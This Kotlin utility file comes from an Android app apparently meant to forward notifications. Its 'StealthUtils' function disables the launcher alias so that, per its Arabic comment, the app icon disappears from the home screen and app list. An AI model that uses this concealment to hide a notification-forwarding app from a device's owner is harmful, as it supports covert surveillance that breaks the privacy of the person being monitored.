package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    // دالة إخفاء أيقونة التطبيق تماماً من الشاشة وقائمة التطبيقات
    fun hideAppIconCompletely(context: Context) {
        val pm = context.packageManager
        
        pm.setComponentEnabledSetting(
            ComponentName(context, "com.itsazni.notificationforwarder.LauncherAlias"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}

